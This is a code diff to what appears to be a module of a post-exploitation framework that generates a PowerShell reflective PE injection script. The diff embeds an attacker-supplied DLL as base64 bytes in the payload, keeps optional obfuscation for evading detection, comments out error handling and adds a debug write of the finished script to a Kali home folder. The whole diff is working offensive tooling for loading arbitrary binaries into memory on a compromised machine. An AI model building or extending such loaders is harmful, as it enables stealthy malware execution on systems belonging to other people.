@@ -89,7 +89,7 @@ class Module(object):
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1"
+        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
         if obfuscate:
             helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
             moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
@@ -114,16 +114,17 @@ class Module(object):
             if option.lower() != "agent":
                 if option.lower() == "dllpath":
                     if values['Value'] != "":
-                        try:
+                        #try:
                             f = open(values['Value'], 'rb')
                             dllbytes = f.read()
                             f.close()
 
                             base64bytes = base64.b64encode(dllbytes)
-                            scriptEnd += " -PEbase64 " + str(base64bytes)
+                            scriptEnd = "\n$PE =  [System.Convert]::FromBase64String(\'" + base64bytes.decode('latin-1') + "\')" + scriptEnd
+                            scriptEnd += " -PEBytes $PE"
 
-                        except:
-                            print(helpers.color("[!] Error in reading/encoding dll: " + str(values['Value'])))
+                        #except:
+                            #print(helpers.color("[!] Error in reading/encoding dll: " + str(values['Value'])))
                 elif values['Value'].lower() == "true":
                     scriptEnd += " -" + str(option)
                 elif values['Value'] and values['Value'] != '':
@@ -132,4 +133,7 @@ class Module(object):
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        f = open('/home/kali/output.txt', 'w')
+        f.write(script)
+        f.close()
         return script
